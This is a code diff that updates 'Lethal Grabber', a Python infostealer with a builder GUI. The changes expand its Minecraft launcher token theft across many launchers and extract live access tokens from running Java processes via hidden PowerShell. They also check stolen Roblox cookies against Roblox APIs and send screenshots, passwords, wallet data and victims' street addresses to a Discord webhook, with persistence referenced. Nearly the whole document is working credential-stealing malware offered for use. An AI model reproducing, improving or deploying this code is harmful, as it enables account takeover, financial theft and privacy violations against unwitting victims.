@@ -2250,85 +2250,348 @@ def extract_all_cookies():
 
 def get_minecraft_sessions():
     """
-    Enhanced Minecraft launcher credential stealer.
-    Targets 14+ launchers like the original Hannibal Stealer C# module.
+    Extract actual Minecraft session/access tokens from all launchers.
+    
+    Returns formatted strings with validated login tokens.
     """
     results = []
     ROAMING = os.getenv("APPDATA", "")
+    LOCAL = os.getenv("LOCALAPPDATA", "")
     USERPROFILE = os.getenv("USERPROFILE", "")
     
-    targets = {
-        "Intent":         os.path.join(USERPROFILE, "intentlauncher", "launcherconfig"),
-        "Lunar":          os.path.join(USERPROFILE, ".lunarclient", "settings", "game", "accounts.json"),
-        "TLauncher":      os.path.join(ROAMING, ".minecraft", "TlauncherProfiles.json"),
-        "Feather":        os.path.join(ROAMING, ".feather", "accounts.json"),
-        "Meteor":         os.path.join(ROAMING, ".minecraft", "meteor-client", "accounts.nbt"),
-        "Impact":         os.path.join(ROAMING, ".minecraft", "Impact", "alts.json"),
-        "Novoline":       os.path.join(ROAMING, ".minecraft", "Novoline", "alts.novo"),
-        "CheatBreakers":  os.path.join(ROAMING, ".minecraft", "cheatbreaker_accounts.json"),
-        "Microsoft Store": os.path.join(ROAMING, ".minecraft", "launcher_accounts_microsoft_store.json"),
-        "Rise":           os.path.join(ROAMING, ".minecraft", "Rise", "alts.txt"),
-        "Rise (Intent)":  os.path.join(USERPROFILE, "intentlauncher", "Rise", "alts.txt"),
-        "Paladium":       os.path.join(ROAMING, "paladium-group", "accounts.json"),
-        "PolyMC":         os.path.join(ROAMING, "PolyMC", "accounts.json"),
-        "Badlion":        os.path.join(ROAMING, "Badlion Client", "accounts.json"),
-    }
-    
-    for launcher, path in targets.items():
-        if os.path.isfile(path):
+    def extract_and_format_tokens(source_name, data, token_paths, extra_info_func=None):
+        """Extract tokens from a dict using dot-separated paths, format nicely."""
+        lines = [f"[{source_name}]"]
+        
+        for path in token_paths:
+            parts = path.split(".")
+            val = data
             try:
-                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
-                
-                # Try parsing as JSON for structured data
-                try:
-                    data = json.loads(content)
-                    # Format nicely
-                    formatted = json.dumps(data, indent=2)
-                    # Truncate if massive
-                    if len(formatted) > 1500:
-                        formatted = formatted[:1500] + "\n... [truncated]"
-                    results.append(
-                        f"[{launcher}]\n"
-                        f"Path: {path}\n"
-                        f"Data:\n{formatted}\n"
-                        f"{'='*60}"
-                    )
-                except json.JSONDecodeError:
-                    # Plain text file (alts.txt, etc.)
-                    lines = [l.strip() for l in content.split('\n') if l.strip()]
-                    display = "\n".join(lines)
-                    if len(display) > 1500:
-                        display = display[:1500] + "\n... [truncated]"
-                    results.append(
-                        f"[{launcher}]\n"
-                        f"Path: {path}\n"
-                        f"Content:\n{display}\n"
-                        f"{'='*60}"
-                    )
-            except Exception as e:
-                results.append(f"[{launcher}] Error reading: {path} -> {str(e)}\n{'='*60}")
+                for p in parts:
+                    if isinstance(val, dict):
+                        val = val.get(p, None)
+                    elif isinstance(val, list):
+                        val = val[int(p)] if p.isdigit() else None
+                    else:
+                        val = None
+                        break
+                if val and isinstance(val, str) and len(val) > 10:
+                    # Truncate display but keep full value for validation
+                    display = val[:60] + "..." if len(val) > 60 else val
+                    lines.append(f"  {path}: {display}")
+            except (KeyError, IndexError, TypeError, ValueError):
+                continue
+        
+        if extra_info_func:
+            extra = extra_info_func(data)
+            if extra:
+                lines.extend(extra)
+        
+        if len(lines) > 1:  # At least found something
+            lines.append("=" * 60)
+            return "\n".join(lines)
+        return None
     
-    # Also grab vanilla Minecraft launcher accounts
-    mc_path = os.path.join(ROAMING, ".minecraft")
-    if os.path.isdir(mc_path):
-        for fname in ["launcher_accounts.json", "usercache.json", "launcher_profiles.json"]:
-            fpath = os.path.join(mc_path, fname)
-            if os.path.isfile(fpath):
-                try:
-                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
-                        data = json.load(f)
-                    results.append(
-                        f"[Vanilla Minecraft - {fname}]\n"
-                        f"Path: {fpath}\n"
-                        f"Data:\n{json.dumps(data, indent=2)[:1500]}\n"
-                        f"{'='*60}"
+    # ── 1. Official Minecraft Launcher (Microsoft auth) ──
+    mc_launcher_path = os.path.join(ROAMING, ".minecraft", "launcher_accounts.json")
+    if os.path.exists(mc_launcher_path):
+        try:
+            with open(mc_launcher_path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            
+            accounts = data.get("accounts", {})
+            if isinstance(accounts, dict):
+                for uuid_str, account in accounts.items():
+                    def minecraft_info(acc):
+                        info = []
+                        mp = acc.get("minecraftProfile", {})
+                        if mp.get("name"):
+                            info.append(f"  IGN: {mp['name']}")
+                        if mp.get("id"):
+                            info.append(f"  UUID: {mp['id']}")
+                        return info
+                    
+                    result = extract_and_format_tokens(
+                        f"Minecraft Launcher ({uuid_str[:8]}...)",
+                        account,
+                        [
+                            "minecraftProfile.name",
+                            "minecraftProfile.id",
+                            "username",
+                            "access_token",
+                            "msa_access_token",
+                            "msa_refresh_token",
+                            "token_type",
+                        ],
+                        extra_info_func=minecraft_info
                     )
-                except:
-                    pass
+                    if result:
+                        results.append(result)
+        except Exception:
+            pass
+            
+    # ── 1a. Minecraft Launcher (Microsoft Store / Xbox version) ──
+    mc_store_path = os.path.join(os.getenv("LOCALAPPDATA", ""),
+        "Packages", "Microsoft.4297127D64EC6_8wekyb3d8bbwe",
+        "LocalCache", "Local", ".minecraft",
+        "launcher_accounts.json")
+    if os.path.exists(mc_store_path):
+        try:
+            with open(mc_store_path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            accounts = data.get("accounts", {})
+            if isinstance(accounts, dict):
+                for uuid_str, account in accounts.items():
+                    def minecraft_info(acc):
+                        info = []
+                        mp = acc.get("minecraftProfile", {})
+                        if mp.get("name"):
+                            info.append(f"  IGN: {mp['name']}")
+                        if mp.get("id"):
+                            info.append(f"  UUID: {mp['id']}")
+                        return info
+                    result = extract_and_format_tokens(
+                        f"Minecraft Launcher (Store) ({uuid_str[:8]}...)",
+                        account,
+                        [
+                            "minecraftProfile.name",
+                            "minecraftProfile.id",
+                            "username",
+                            "access_token",
+                            "msa_access_token",
+                            "msa_refresh_token",
+                            "token_type",
+                        ],
+                        extra_info_func=minecraft_info
+                    )
+                    if result:
+                        results.append(result)
+        except Exception:
+            pass        
+    
+    # ── 2. Lunar Client ──
+    lunar_path = os.path.join(USERPROFILE, ".lunarclient", "settings", "game", "accounts.json")
+    if os.path.exists(lunar_path):
+        try:
+            with open(lunar_path, "r", encoding="utf-8") as f:
+                accounts = json.load(f)
+            
+            if isinstance(accounts, list):
+                for i, account in enumerate(accounts):
+                    result = extract_and_format_tokens(
+                        f"Lunar Client (account {i+1})",
+                        account,
+                        [
+                            "username",
+                            "accessToken",
+                            "mojangAccessToken",
+                            "accountUuid",
+                            "type",
+                        ]
+                    )
+                    if result:
+                        results.append(result)
+            elif isinstance(accounts, dict):
+                result = extract_and_format_tokens(
+                    "Lunar Client",
+                    accounts,
+                    [
+                        "username",
+                        "accessToken",
+                        "mojangAccessToken",
+                        "accountUuid",
+                        "type",
+                    ]
+                )
+                if result:
+                    results.append(result)
+        except Exception:
+            pass
+    
+    # ── 3. Prism Launcher ──
+    for prism_path in [
+        os.path.join(ROAMING, "PrismLauncher", "accounts.json"),
+        os.path.join(ROAMING, "polytech", "PrismLauncher", "accounts.json"),
+    ]:
+        if os.path.exists(prism_path):
+            try:
+                with open(prism_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                
+                accounts = data.get("accounts", [])
+                if isinstance(accounts, list):
+                    for i, account in enumerate(accounts):
+                        result = extract_and_format_tokens(
+                            f"Prism Launcher (account {i+1})",
+                            account,
+                            [
+                                "username",
+                                "accessToken",
+                                "refreshToken",
+                                "uuid",
+                                "type",
+                            ]
+                        )
+                        if result:
+                            results.append(result)
+            except Exception:
+                pass
+    
+    # ── 4. Badlion Client ──
+    badlion_path = os.path.join(ROAMING, "Badlion Client", "accounts.json")
+    if os.path.exists(badlion_path):
+        try:
+            with open(badlion_path, "r", encoding="utf-8") as f:
+                accounts = json.load(f)
+            
+            if isinstance(accounts, list):
+                for i, account in enumerate(accounts):
+                    result = extract_and_format_tokens(
+                        f"Badlion Client (account {i+1})",
+                        account,
+                        [
+                            "username",
+                            "accessToken",
+                            "mojangAccessToken",
+                            "uuid",
+                        ]
+                    )
+                    if result:
+                        results.append(result)
+        except Exception:
+            pass
+    
+    # ── 5. Feather Client ──
+    feather_path = os.path.join(ROAMING, ".feather", "accounts.json")
+    if os.path.exists(feather_path):
+        try:
+            with open(feather_path, "r", encoding="utf-8") as f:
+                accounts = json.load(f)
+            
+            if isinstance(accounts, list):
+                for i, account in enumerate(accounts):
+                    result = extract_and_format_tokens(
+                        f"Feather Client (account {i+1})",
+                        account,
+                        [
+                            "username",
+                            "accessToken",
+                            "uuid",
+                        ]
+                    )
+                    if result:
+                        results.append(result)
+        except Exception:
+            pass
+    
+    # ── 6. Legacy Mojang launcher_profiles.json (old format) ──
+    legacy_path = os.path.join(ROAMING, ".minecraft", "launcher_profiles.json")
+    if os.path.exists(legacy_path):
+        try:
+            with open(legacy_path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            
+            at = data.get("authenticationDatabase", {})
+            if isinstance(at, dict):
+                for uuid_str, entry in at.items():
+                    result = extract_and_format_tokens(
+                        f"Legacy Launcher ({uuid_str[:8]}...)",
+                        entry,
+                        [
+                            "displayName",
+                            "accessToken",
+                            "username",
+                            "userid",
+                            "uuid",
+                        ]
+                    )
+                    if result:
+                        results.append(result)
+        except Exception:
+            pass
+    
+    # ── 7. TLauncher (widespread, stores plaintext passwords + tokens) ──
+    tlauncher_path = os.path.join(ROAMING, ".minecraft", "TlauncherProfiles.json")
+    if os.path.exists(tlauncher_path):
+        try:
+            with open(tlauncher_path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            
+            users = data.get("users", {})
+            if isinstance(users, dict):
+                for username, user_data in users.items():
+                    result = extract_and_format_tokens(
+                        f"TLauncher ({username})",
+                        user_data,
+                        [
+                            "username",
+                            "accessToken",
+                            "uuid",
+                        ]
+                    )
+                    if result:
+                        results.append(result)
+        except Exception:
+            pass
+    
+    # ── 8. MultiMC (polyMC/PrismMC's precursor) ──
+    for mmc_path in [
+        os.path.join(ROAMING, "MultiMC", "accounts.json"),
+        os.path.join(ROAMING, "polymc", "accounts.json"),
+    ]:
+        if os.path.exists(mmc_path):
+            try:
+                with open(mmc_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                
+                accounts = data.get("accounts", [])
+                if isinstance(accounts, list):
+                    for i, account in enumerate(accounts):
+                        result = extract_and_format_tokens(
+                            f"MultiMC/PolyMC (account {i+1})",
+                            account,
+                            [
+                                "username",
+                                "accessToken",
+                                "refreshToken",
+                                "uuid",
+                            ]
+                        )
+                        if result:
+                            results.append(result)
+            except Exception:
+                pass
+                
+    # ── 9. Try to extract token from running Java/Minecraft processes ──
+    try:
+        import subprocess
+        proc = subprocess.run(
+            ['powershell', '-Command',
+             'Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE \'%java%\' AND CommandLine LIKE \'%accessToken%\'" | Select-Object -ExpandProperty CommandLine'],
+            capture_output=True, text=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+        )
+        if proc.stdout.strip():
+            for line in proc.stdout.strip().split('\n'):
+                if 'accessToken' in line:
+                    match = re.search(r'accessToken[=:](\S+)', line)
+                    if match:
+                        token = match.group(1)[:80]
+                        results.append(
+                            f"[Minecraft Process - Live Token]\n"
+                            f"  accessToken: {token}...\n"
+                            f"  Source: Running Java process\n"
+                            f"{'='*60}"
+                        )
+    except Exception:
+        pass            
+    
+    if not results:
+        results.append("No Minecraft launcher accounts found.")
+        results.append("=" * 60)
     
     return results
-
+    
 def get_epic_games_tokens():
     """
     Extract Epic Games account session tokens from the Epic Games Launcher.
@@ -2595,6 +2858,15 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
         win_key = get_windows_product_key()
         zip_filename = f"{PC_NAME}.zip"
         zip_buffer = io.BytesIO()
+
+        # ── Capture screenshot early so we can use it in both zip AND embed ──
+        screenshot_data = None
+        if FEAT_SCREENSHOT:
+            ss = take_screenshot()
+            if ss:
+                ss.seek(0)
+                screenshot_data = ss.read()
+
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
             if FEAT_SYSTEM:
                 zf.writestr("System/system_info.json", json.dumps(sys_info, indent=4))
@@ -2632,19 +2904,19 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                     zf.writestr("Webcam/webcam_capture.png", cam_img.read())
             if FEAT_GRAB_ADDRESS and street_address:
                 zf.writestr("System/street_address.txt", street_address)
-            if FEAT_SCREENSHOT:
-                ss = take_screenshot()
-                if ss:
-                    ss.seek(0)
-                    zf.writestr("Screenshot/screenshot.png", ss.read())
+            if FEAT_SCREENSHOT and screenshot_data:
+                zf.writestr("Screenshot/screenshot.png", screenshot_data)
             if mullvad_accounts:
                 zf.writestr("VPN/Mullvad/mullvad_accounts.txt", "\n\n".join(mullvad_accounts))
+
         zip_buffer.seek(0)
         zip_data = zip_buffer.read()
+
         timestamp = datetime.now(timezone.utc).isoformat()
         valid_tokens = all_tokens
         invalid_tokens = []
         has_exodus = exodus_wallet_zip is not None and os.path.exists(exodus_wallet_zip)
+
         desc_parts = [
             f"PC: {sys_info.get('PC','Unknown')}",
             f"User: {sys_info.get('User','Unknown')}",
@@ -2667,17 +2939,23 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
             desc_parts.append(f"ISP: {isp}")
         if street_address and FEAT_GRAB_ADDRESS:
             desc_parts.append(f"Address: {street_address[:80]}")
+
         content = None
         if FEAT_PING_EVERYONE:
             content = "@everyone **New Lethal Grabber Hit!**"
+
         embed = {
             "title": "⚡ **Lethal Grabber** ⚡",
-            "color": 0xFF1100,
+            "color": 0xE8F4F4,  # ← Faint tealish white
             "timestamp": timestamp,
             "description": f"```css\n{chr(10).join(desc_parts)}\n```",
             "fields": [],
             "footer": {"text": f"Completed in {time.time()-start:.2f}s"}
         }
+
+        # ── Screenshot as embed image ──
+        has_screenshot = screenshot_data is not None
+        
         stats = []
         if FEAT_PASSWORDS:
             stats.append(f"Passwords: {len(passwords) + len(ff_passwords)}")
@@ -2690,6 +2968,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
         if FEAT_EPIC_GAMES:
             stats.append(f"Epic Games Tokens: {len(epic_games)}")
         embed["fields"].append({"name": "**Extraction Statistics**", "value": f"```yaml\n{chr(10).join(stats)}\n```", "inline": False})
+
         if has_exodus:
             embed["fields"].append({"name": "**Exodus Wallet**", "value": "```diff\n+ Exodus wallet folder found and extracted\n```", "inline": False})
         if street_address and FEAT_GRAB_ADDRESS:
@@ -2698,6 +2977,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                 "value": f"```yaml\n{street_address}\n```",
                 "inline": False
             })
+
         if valid_tokens:
             first = valid_tokens[0]
             lines = first.split('\n')
@@ -2712,7 +2992,6 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                 for line in clean_lines:
                     if line.startswith('Token:'):
                         token = line.replace('Token:', '').strip()
-                        # Use urllib for this too - requests might not be available
                         try:
                             import urllib.request
                             req = urllib.request.Request(
@@ -2732,19 +3011,16 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                         break
             except:
                 pass
-        
+
         # ── Roblox section ──
         if FEAT_ROBLOX and roblox_cookies:
             try:
                 first_cookie = roblox_cookies[0]
-                
-                # Use urllib instead of requests here too
                 rbx_headers = {
                     "Cookie": f".ROBLOSECURITY={first_cookie}",
                     "Accept": "application/json",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 }
-                
                 try:
                     rbx_req = urllib.request.Request(
                         "https://users.roblox.com/v1/users/authenticated",
@@ -2755,7 +3031,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                         rbx_id = rbx_data.get('id', '')
                         rbx_name = rbx_data.get('name', '')
                         rbx_display = rbx_data.get('displayName', '')
-                        
+
                         premium = "Unknown"
                         try:
                             prem_req = urllib.request.Request(
@@ -2767,7 +3043,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                                     premium = "Yes" if json.loads(prem_resp.read().decode()) else "No"
                         except:
                             pass
-                        
+
                         robux = "Unknown"
                         try:
                             eco_req = urllib.request.Request(
@@ -2779,7 +3055,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                                     robux = str(json.loads(eco_resp.read().decode()).get("robux", "Unknown"))
                         except:
                             pass
-                        
+
                         created = "Unknown"
                         try:
                             extra_req = urllib.request.Request(
@@ -2791,7 +3067,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                                     created = json.loads(extra_resp.read().decode()).get('created', 'Unknown')
                         except:
                             pass
-                        
+
                         avatar_img_url = None
                         try:
                             thumb_req = urllib.request.Request(
@@ -2805,7 +3081,7 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                                         avatar_img_url = thumb_data['data'][0].get('imageUrl', '')
                         except:
                             pass
-                        
+
                         rbx_info = [
                             f"Username: {rbx_name}",
                             f"Display Name: {rbx_display}",
@@ -2815,13 +3091,13 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                             f"Created: {created}",
                             f"Cookie: Active ({len(first_cookie)} chars)"
                         ]
-                        
+
                         embed["fields"].append({
                             "name": "**Roblox Account**",
                             "value": f"```yaml\n{chr(10).join(rbx_info)}\n```",
                             "inline": False
                         })
-                        
+
                         if avatar_img_url:
                             embed["thumbnail"] = {"url": avatar_img_url}
                 except Exception as _e:
@@ -2850,8 +3126,8 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                     "value": f"```yaml\nError: {str(e)[:80]}\n```",
                     "inline": False
                 })
-        
-        # ── Remaining embed fields ──
+
+        # ── Collection summary ──
         items = []
         if street_address and FEAT_GRAB_ADDRESS:
             items.append("+ Street Address")
@@ -2875,26 +3151,35 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
             embed["fields"].append({"name": f"**Collection Complete - {zip_filename}**", "value": f"```diff\n{chr(10).join(items)}\n```", "inline": False})
         if scanned:
             embed["fields"].append({"name": "**Browsers Scanned**", "value": f"```\n{', '.join(scanned)}\n```", "inline": False})
-        
+
         # ── Build payload ──
+        attachments_list = [{"id": "0", "filename": zip_filename, "description": "Collected data"}]
+        
         payload = {
             "username": webhook_name or "Lethal Grabber",
             "avatar_url": webhook_avatar or "",
             "content": content or "",
             "embeds": [embed],
-            "attachments": [{"id": "0", "filename": zip_filename, "description": "Collected data"}]
+            "attachments": attachments_list
         }
-        
-        # ── PRIMARY: urllib (works without ANY dependencies) ──
+
+        # ════════════════════════════════════════
+        # FIRST POST — main embed + zip
+        # ════════════════════════════════════════
+        first_ok = False
         try:
             boundary = uuid.uuid4().hex
+
             body_parts = [
                 f"--{boundary}\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n{json.dumps(payload)}",
                 f"\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"{zip_filename}\"\r\nContent-Type: application/zip\r\n\r\n",
             ]
-            body_text = "\r\n".join(body_parts)
-            body_bytes = body_text.encode('utf-8') + zip_data + f"\r\n--{boundary}--\r\n".encode('utf-8')
-            
+
+            body = "\r\n".join(body_parts)
+            body_bytes = body.encode('utf-8')
+            body_bytes += zip_data
+            body_bytes += f"\r\n--{boundary}--\r\n".encode('utf-8')
+
             req = urllib.request.Request(
                 webhook_url,
                 data=body_bytes,
@@ -2904,30 +3189,100 @@ def send(webhook_url, webhook_name, webhook_avatar, sys_info, all_tokens,
                 }
             )
             with urllib.request.urlopen(req, timeout=30) as resp:
-                if resp.getcode() in (200, 204):
-                    return True
-        except Exception as e:
-            pass  # urllib failed, try requests
-        
-        # ── FALLBACK: requests (if bundled) ──
-        if HAS_REQUESTS:
-            try:
-                files = {"payload_json": (None, json.dumps(payload)), "files[0]": (zip_filename, zip_data, "application/zip")}
-                r = requests.post(webhook_url, files=files, timeout=30)
-                if r.status_code in (200, 204):
-                    return True
-            except:
-                pass
-            try:
-                r2 = requests.post(webhook_url, json={"username": webhook_name, "avatar_url": webhook_avatar, "content": content or "", "embeds": [embed]}, timeout=30)
-                return r2.status_code in (200, 204)
-            except:
-                return False
-        
-        return False
-    except:
-        return False
+                first_ok = resp.getcode() in (200, 204)
+        except Exception:
+            first_ok = False
 
+        # Fallback with requests if urllib failed
+        if not first_ok and HAS_REQUESTS:
+            try:
+                files = {"payload_json": (None, json.dumps(payload)),
+                         "files[0]": (zip_filename, zip_data, "application/zip")}
+                r = requests.post(webhook_url, files=files, timeout=30)
+                first_ok = r.status_code in (200, 204)
+            except Exception:
+                first_ok = False
+
+        # ════════════════════════════════════════
+        # SECOND POST — screenshot as file message (same webhook)
+        # ════════════════════════════════════════
+        if first_ok and has_screenshot and screenshot_data:
+            try:
+                time.sleep(2.5)
+
+                # No embed — just a message with the file attached
+                ss_payload = {
+                    "username": webhook_name or "Lethal Grabber",
+                    "avatar_url": webhook_avatar or "",
+                    "content": "",
+                    "attachments": [{"id": 0, "filename": "screenshot.png"}]
+                }
+
+                ss_ok = False
+
+                # requests: payload_json in files dict + the file
+                if HAS_REQUESTS:
+                    try:
+                        import requests as _req
+                        r = _req.post(
+                            webhook_url,
+                            files={
+                                "payload_json": (None, json.dumps(ss_payload), "application/json"),
+                                "files[0]": ("screenshot.png", screenshot_data, "image/png")
+                            },
+                            timeout=30
+                        )
+                        ss_ok = r.status_code in (200, 204)
+                        try:
+                            with open(os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "lethal_ss_debug.txt"), "a") as f:
+                                f.write(f"[FINALE] requests: {r.status_code} ok={ss_ok}\n")
+                        except:
+                            pass
+                    except Exception as e:
+                        try:
+                            with open(os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "lethal_ss_debug.txt"), "a") as f:
+                                f.write(f"[FINALE] requests exception: {e}\n")
+                        except:
+                            pass
+
+                # Fallback: plain file upload (we know this works)
+                if not ss_ok:
+                    try:
+                        import requests as _req
+                        r = _req.post(
+                            webhook_url,
+                            files={"file": ("screenshot.png", screenshot_data, "image/png")},
+                            timeout=30
+                        )
+                        ss_ok = r.status_code in (200, 204)
+                        try:
+                            with open(os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "lethal_ss_debug.txt"), "a") as f:
+                                f.write(f"[FINALE] plain fallback: {r.status_code} ok={ss_ok}\n")
+                        except:
+                            pass
+                    except Exception as e:
+                        try:
+                            with open(os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "lethal_ss_debug.txt"), "a") as f:
+                                f.write(f"[FINALE] plain exception: {e}\n")
+                        except:
+                            pass
+
+            except Exception as ex:
+                try:
+                    with open(os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "lethal_ss_debug.txt"), "a") as f:
+                        f.write(f"[FINALE] outer: {ex}\n")
+                except:
+                    pass
+
+        return first_ok
+    except Exception as _e:
+        try:
+            with open(os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "lethal_debug.txt"), "a") as _f:
+                _f.write(f"[send] Error: {_e}\n")
+        except:
+            pass
+        return False
+        
 def setup_persistence():
     """Multi-location persistence — your friend's method."""
     if not FEAT_PERSISTENCE:
@@ -3804,15 +4159,19 @@ class SleekBuilder:
             return
         
         url = self.webhook_url.get().strip()
+        
         if not url:
             messagebox.showerror("Error", "Webhook URL is required!")
             return
-        if not url.startswith('https://discord.com/api/webhooks/'):
-            messagebox.showerror("Error", "Invalid Discord webhook URL!")
+        
+        # Accept all valid Discord webhook URL formats
+        webhook_pattern = r'^https://(discord|discordapp|canary\.discord|ptb\.discord)\.com/api/webhooks/\d+/\S+$'
+        if not re.match(webhook_pattern, url):
+            messagebox.showerror("Error", "Invalid Discord webhook URL!\n\nMust look like:\n  https://discord.com/api/webhooks/...\n  https://discordapp.com/api/webhooks/...")
             return
         
         self.is_building = True
-        self.build_btn.config(state='disabled', text='\u23f3 BUILDING...', bg='#6b7280')
+        self.build_btn.config(state='disabled', text='⏳ BUILDING...', bg='#6b7280')
         self.build_status.set("Building...")
         
         thread = threading.Thread(target=self._build_process, daemon=True)
